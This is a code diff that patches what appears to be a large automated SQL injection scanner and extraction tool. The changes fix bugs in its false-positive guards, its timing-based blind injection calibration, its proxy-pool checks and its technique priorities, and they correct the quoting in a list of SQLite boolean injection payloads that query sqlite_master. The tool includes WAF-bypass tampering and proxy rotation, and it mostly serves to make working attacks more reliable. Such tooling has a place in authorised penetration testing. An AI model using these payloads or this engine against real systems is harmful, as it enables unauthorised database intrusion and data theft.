             print(f"[!!] SQL INJECTION CONFIRMED [{_early_tech_c}] {_early_dbms_c} "
@@ -125000,7 +125156,7 @@ class ProxyPoolManager:
         if not entries: return 0
         LOG.info(f"Proxy check: {len(entries)} proxies (concurrency={self._max_checks})")
         sem = asyncio.Semaphore(self._max_checks)
-        await asyncio.gather(*[self._check_one(e, sem, target_url, return_exceptions=True)
+        await asyncio.gather(*[self._check_one(e, sem, target_url)
                                 for e in entries], return_exceptions=True)
         self._pool = entries
         self._refresh_live()
@@ -131679,6 +131835,7 @@ class SafeModeVerifier:
             except Exception as _sqr_e:
                 LOG.debug("Suppressed in verify: %s", _sqr_e)
         stable = False
+        fps = [fp for fp in fps if fp is not None]
         if len(fps) >= 2:
             sims = [SimHasher.body_similarity(
                         ResponseNormaliser.normalise(fps[i].body),
@@ -131886,7 +132043,7 @@ class SafeModeVerifier:
                 norm_t = ResponseNormaliser.normalise(_extract_body_safe(fp_t)) if _validate_response(fp_t, allow_empty=True) else b""
                 norm_f = ResponseNormaliser.normalise(_extract_body_safe(fp_f)) if _validate_response(fp_f, allow_empty=True) else b""
                 sim    = SimHasher.body_similarity(norm_t, norm_f)
-                _len_d = abs(fp_t.content_length - fp_f.content_length)
+                _len_d = abs((fp_t.content_length or 0) - (fp_f.content_length or 0))
                 _stat_d = _get_safe_status_code(fp_t) != fp_f.status_code
                 if sim < 0.95 or _len_d > 100 or _stat_d:
                     _bool_confirms += 1
@@ -148358,6 +148515,7 @@ class WelchConfirmer:
         true_suffix: str, false_suffix: str,
         baseline: Dict,
         n_pairs: Optional[int] = None,
+        technique: str = '',
     ) -> Tuple[bool, float, str]:
         """
         Returns (confirmed, p_value, reason_string).
@@ -151883,7 +152041,7 @@ class FalsePositiveValidator:
                          data_fmt: str, param: str, original: str,
                          true_payload: str, false_payload: str,
                          tamper_chain: List[str], n_trials: int = 3,
-                         config=None) -> Dict:
+                         config=None, technique: str = '') -> Dict:
         """Run N trials of true/false and compute statistical confidence."""
         true_lengths = []
         false_lengths = []
@@ -152438,9 +152596,16 @@ class BlindBoolCalibrator:
         self.false_sims.append(similarity)
         self._recalculate()
 
+    def update(self, similarity: float, is_true: bool) -> None:
+        """Unified update method: routes to record_true or record_false by polarity."""
+        if is_true:
+            self.record_true(similarity)
+        else:
+            self.record_false(similarity)
+
     def _recalculate(self):
         """Set threshold at optimal decision boundary."""
-        if len(self.true_sims) < 2 or len(self.false_sims) < 2:
+        if not self.true_sims or not self.false_sims:
             return
         mean_t = sum(self.true_sims) / len(self.true_sims)
         mean_f = sum(self.false_sims) / len(self.false_sims)
@@ -158536,7 +158701,9 @@ class ChameleonExtractorV18(ChameleonExtractor):
                 return expr
 
         # Fallback: use first family without noise
-        return fams[0].format(cond=cond, t=t, f=f)
+        expr = fams[0].format(cond=cond, t=t, f=f)
+        self._record_sent(expr)
+        return expr
 
     async def _probe_condition(self, condition: str, dbms: str) -> float:
         """
@@ -160702,6 +160869,10 @@ class TechniqueCascadeEngineV18(TechniqueCascadeEngine):
                       # missing. Second-order requires a store+trigger cycle, making it
                       # the slowest technique. Default 0.5 inflated its initial priority
                       # above T/HQ/BT/S — causing SO probes to run before faster ones.
+        "DS": 0.28,   # BUG-BASE-PRIOR-DS FIX: DS (Differential Stacked) was missing from
+                      # BASE_PRIOR. Without an explicit entry, update_prior("DS") fell back to
+                      # the 0.5 hardcoded default, ranking DS above T/HQ/BT/S without justification.
+                      # 0.28 matches SO — DS likewise requires a staged query cycle.
         "ST": 0.45,   # Standard payload (versatile)
         "NV": 0.40,   # Novel bypass
         "WB": 0.38,   # WAF bypass
@@ -163414,7 +163585,7 @@ class FalsePositiveGuardV18:
         if len(self._clean_cluster) > 20:
             self._clean_cluster.pop(0)
 
-    def _in_clean_cluster(self, body: bytes, threshold: float = 0.73,
+    def _in_clean_cluster(self, body: bytes, threshold: float = 0.78,
                           _snapshot: list = None) -> bool:
         # FIX-REQ3-CLUSTER: Lowered default threshold from 0.88 → 0.82 → 0.78.
         # BUG-PCV-R3-B FIX: Lowered default threshold from 0.88 → 0.82.
@@ -163496,7 +163667,8 @@ class FalsePositiveGuardV18:
                       param, original, tamper_chain, baseline,
                       true_payload: str, false_payload: str,
                       true_fp: "ResponseFingerprint",
-                      false_fp: "ResponseFingerprint") -> Tuple[bool, float]:
+                      false_fp: "ResponseFingerprint",
+                      technique: str = '') -> Tuple[bool, float]:
         """
         Run all FP guard layers. Returns (is_confirmed, confidence).
         """
@@ -163898,6 +164070,7 @@ class TimingPrecisionBooster:
         # param is not None so empty-string params still route through _send_injected.
         _use_injected = bool(data_fmt and param is not None)
         times: List[float] = []
+        _skew_samples: List[float] = []
         for _ in range(n_probes):
             # BUG-TPB-CALIBRATE-PCV FIX (Req 3): Stop calibration probes when another
             # surface has confirmed injection but NOT when this surface's own PCV is
@@ -163925,7 +164098,7 @@ class TimingPrecisionBooster:
                         # Normalise to ms
                         if rt_ms < 10:   # likely in seconds
                             rt_ms *= 1000
-                        self._skew_ms = rt_ms
+                        _skew_samples.append(rt_ms)
                     except Exception:
                         pass
             except Exception:
@@ -163935,6 +164108,9 @@ class TimingPrecisionBooster:
             await asyncio.sleep(0.05)
 
         self._baseline_samples = times
+        if _skew_samples:
+            _skew_samples.sort()
+            self._skew_ms = _skew_samples[len(_skew_samples) // 2]
 
         # IQR-based minimum sleep recommendation
         if not times:
@@ -164015,7 +164191,7 @@ class TimingPrecisionBooster:
         _raw_clean_med = self._iqr_median(times_clean) - self._skew_ms
         _baseline_floor = (self._iqr_median(self._baseline_samples)
                            if self._baseline_samples else 1.0) or 1.0
-        clean_med = max(_raw_clean_med, _baseline_floor * 0.5)
+        clean_med = max(_raw_clean_med, _baseline_floor)
 
         expected_delta = sleep_sec * 1000 * 0.70
         actual_delta   = inj_med - clean_med
@@ -165557,7 +165733,8 @@ _BASELINE_DRIFT_GUARD   = None  # BUG-FIX: BaselineDriftGuard.__init__ requires 
 async def _run_fp_guards_boolean(
         engine, config, method, url, data, data_fmt,
         param, original, tamper_chain, baseline,
-        true_payload, false_payload, true_fp, false_fp):
+        true_payload, false_payload, true_fp, false_fp,
+        technique: str = ''):
     """
     PCV-FIX-1,2,3: Run FalsePositiveGuardV18 (6 layers), WelchConfirmer (Welch t-test),
     and FalsePositiveValidator (mean/variance) against a boolean candidate.
@@ -166048,7 +166225,8 @@ async def _run_fp_guards_boolean(
         _fg_ok, _fg_conf = await _fpg.verify(
             engine, config, method, url, data, data_fmt,
             param, original, tamper_chain, baseline,
-            true_payload, false_payload, true_fp, false_fp)
+            true_payload, false_payload, true_fp, false_fp,
+            technique=technique)
         if not _fg_ok:
             LOG.debug(f'[FP-Guards] FalsePositiveGuardV18 rejected {param!r} '
                       f'(conf={_fg_conf:.3f}) — L1-L6 check failed')
@@ -166087,7 +166265,8 @@ async def _run_fp_guards_boolean(
         _wc_ok, _wc_pval, _wc_reason = await WelchConfirmer.confirm(
             engine, config, method, url, data, data_fmt,
             param, original, tamper_chain,
-            true_payload, false_payload, baseline, n_pairs=_welch_n_pairs)
+            true_payload, false_payload, baseline, n_pairs=_welch_n_pairs,
+            technique=technique)
         if not _wc_ok:
             LOG.debug(f'[FP-Guards] WelchConfirmer rejected {param!r}: {_wc_reason}')
             return False, 0.0
@@ -166096,7 +166275,7 @@ async def _run_fp_guards_boolean(
         _fv = await FalsePositiveValidator.validate(
             engine, method, url, data, data_fmt,
             param, original, true_payload, false_payload,
-            tamper_chain, n_trials=3, config=config)
+            tamper_chain, n_trials=3, config=config, technique=technique)
         if not _fv.get('valid', False):
             LOG.debug(f'[FP-Guards] FalsePositiveValidator rejected {param!r}: '
                       f'conf={_fv.get("confidence",0):.3f}')
@@ -176021,7 +176200,7 @@ SQLITE_BOOLEAN_PAYLOADS = [
     "AND typeof(1)='integer'-- -",
     "AND typeof(1)<>'integer'-- -",
     "AND typeof('a')='text'-- -",
-    "AND typeof(NULL)='integer'-- -",
+    "AND typeof(NULL)='null'-- -",
     'AND LENGTH(sqlite_version())>0-- -',
     'AND LENGTH(sqlite_version())<0-- -',
     "AND sqlite_version() LIKE '3%'-- -",
@@ -176046,8 +176225,8 @@ SQLITE_BOOLEAN_PAYLOADS = [
     'AND (SELECT sqlite_version()) IS NOT NULL-- -',
     "AND (SELECT sqlite_version()) NOT LIKE 'current_user%'",
     "AND (SELECT sqlite_version()) NOT LIKE '(SELECT sqlite_version())%'",
-    "AND (SELECT sqlite_version()) NOT LIKE '(SELECT name FROM sqlite_master WHERE type='table' LIMIT 1)%'",
-    "AND (SELECT sqlite_version()) NOT LIKE '(SELECT count(*) FROM sqlite_master WHERE type='table')%'",
+    "AND (SELECT sqlite_version()) NOT LIKE '(SELECT name FROM sqlite_master WHERE type=''table'' LIMIT 1)%'",
+    "AND (SELECT sqlite_version()) NOT LIKE '(SELECT count(*) FROM sqlite_master WHERE type=''table'')%'",
     "AND (SELECT sqlite_version()) NOT LIKE '(SELECT hex(randomblob(1)))%'",
     "AND (SELECT sqlite_version()) NOT LIKE '(SELECT quote(random()))%'",
     'AND (SELECT sqlite_version()) IS NULL-- -',
@@ -176065,8 +176244,8 @@ SQLITE_BOOLEAN_PAYLOADS = [
     "AND INSTR((SELECT sqlite_version()),'zzz')=1-- -",
     "AND INSTR((SELECT sqlite_version()),'current_user')=0",
     "AND INSTR((SELECT sqlite_version()),'(SELECT sqlite_version())')=0",
-    "AND INSTR((SELECT sqlite_version()),'(SELECT name FROM sqlite_master WHERE type='table' LIMIT 1)')=0",
-    "AND INSTR((SELECT sqlite_version()),'(SELECT count(*) FROM sqlite_master WHERE type='table')')=0",
+    "AND INSTR((SELECT sqlite_version()),'(SELECT name FROM sqlite_master WHERE type=''table'' LIMIT 1)')=0",
+    "AND INSTR((SELECT sqlite_version()),'(SELECT count(*) FROM sqlite_master WHERE type=''table'')')=0",
     "AND INSTR((SELECT sqlite_version()),'(SELECT hex(randomblob(1)))')=0",
     "AND INSTR((SELECT sqlite_version()),'(SELECT quote(random()))')=0",
     'AND LENGTH((SELECT sqlite_version()))<0-- -',
@@ -176079,8 +176258,8 @@ SQLITE_BOOLEAN_PAYLOADS = [
     "AND SUBSTR((SELECT sqlite_version()),1,1)='z'-- -",
     "AND SUBSTR((SELECT sqlite_version()),1,1)='z'-- -",
     "AND SUBSTR((SELECT sqlite_version()),1,INSTR((SELECT sqlite_version()),'(SELECT sqlite_version())')-1)='5'",
-    "AND SUBSTR((SELECT sqlite_version()),1,INSTR((SELECT sqlite_version()),'(SELECT name FROM sqlite_master WHERE type='table' LIMIT 1)')-1)='65'",
-    "AND SUBSTR((SELECT sqlite_version()),1,INSTR((SELECT sqlite_version()),'(SELECT count(*) FROM sqlite_master WHERE type='table')')-1)='97'",
+    "AND SUBSTR((SELECT sqlite_version()),1,INSTR((SELECT sqlite_version()),'(SELECT name FROM sqlite_master WHERE type=''table'' LIMIT 1)')-1)='65'",
+    "AND SUBSTR((SELECT sqlite_version()),1,INSTR((SELECT sqlite_version()),'(SELECT count(*) FROM sqlite_master WHERE type=''table'')')-1)='97'",
     "AND SUBSTR((SELECT sqlite_version()),1,INSTR((SELECT sqlite_version()),'(SELECT hex(randomblob(1)))')-1)='115'",
     "AND SUBSTR((SELECT sqlite_version()),1,INSTR((SELECT sqlite_version()),'(SELECT quote(random()))')-1)='100'",
     'AND UNICODE(SUBSTR((SELECT sqlite_version()),1,1))<48-- -',
@@ -176092,8 +176271,8 @@ SQLITE_BOOLEAN_PAYLOADS = [
     'AND UNICODE(SUBSTR((SELECT sqlite_version()),(SELECT quote(random())),1)) BETWEEN 100 AND w',
     "AND TYPEOF((SELECT sqlite_version()))<>'current_user'",
     "AND TYPEOF((SELECT sqlite_version()))<>'(SELECT sqlite_version())'",
-    "AND TYPEOF((SELECT sqlite_version()))<>'(SELECT name FROM sqlite_master WHERE type='table' LIMIT 1)'",
-    "AND TYPEOF((SELECT sqlite_version()))<>'(SELECT count(*) FROM sqlite_master WHERE type='table')'",
+    "AND TYPEOF((SELECT sqlite_version()))<>'(SELECT name FROM sqlite_master WHERE type=''table'' LIMIT 1)'",
+    "AND TYPEOF((SELECT sqlite_version()))<>'(SELECT count(*) FROM sqlite_master WHERE type=''table'')'",
     "AND TYPEOF((SELECT sqlite_version()))<>'(SELECT hex(randomblob(1)))'",
     "AND TYPEOF((SELECT sqlite_version()))<>'(SELECT quote(random()))'",
     'AND LENGTH(HEX((SELECT sqlite_version())))>9999-- -',
